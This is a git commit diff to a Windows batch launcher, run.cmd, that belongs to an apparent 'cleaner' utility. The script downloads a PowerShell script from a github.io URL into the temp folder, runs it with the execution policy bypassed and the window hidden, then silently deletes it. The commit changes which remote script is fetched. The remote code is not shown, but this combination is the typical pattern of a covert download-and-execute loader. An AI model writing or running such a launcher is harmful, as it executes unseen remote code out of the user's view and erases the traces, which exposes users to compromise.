5d2ffdef6710730a76bd69a209675db5e9e04e01
cleands <sevao2021@mail.ru>
2026-08-02 03:40:55 +0300

    Modify run.cmd to use cleaner.ps1 script
    Updated script to download and execute a different PowerShell script with ASCII encoding.

--- run.cmd
+++ run.cmd
@@ -1,15 +1,11 @@
 @echo off
 chcp 65001 > nul
-set "PS_FILE=%TEMP%\clientrds_run.ps1"
+set "PS_FILE=%TEMP%\cleanerds_run.ps1"
 
-:: Скачивание и сохранение скрипта с обязательной меткой UTF8-BOM
 powershell -NoProfile -ExecutionPolicy Bypass -Command "^
-    $utf8Encoding = New-Object System.Text.UTF8Encoding($true); ^
-    $code = (Invoke-RestMethod -Uri 'https://cleands.github.io/cds/cleaner.ps1'); ^
-    [System.IO.File]::WriteAllText('%PS_FILE%', $code, $utf8Encoding);"
+    $code = (Invoke-RestMethod -Uri 'https://cleands.github.io/cds/script.ps1'); ^
+    [System.IO.File]::WriteAllText('%PS_FILE%', $code, [System.Text.Encoding]::ASCII);"
 
-:: Запуск готового PS1 файла
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"
 
-:: Очистка
 del /f /q "%PS_FILE%" > nul 2>&1
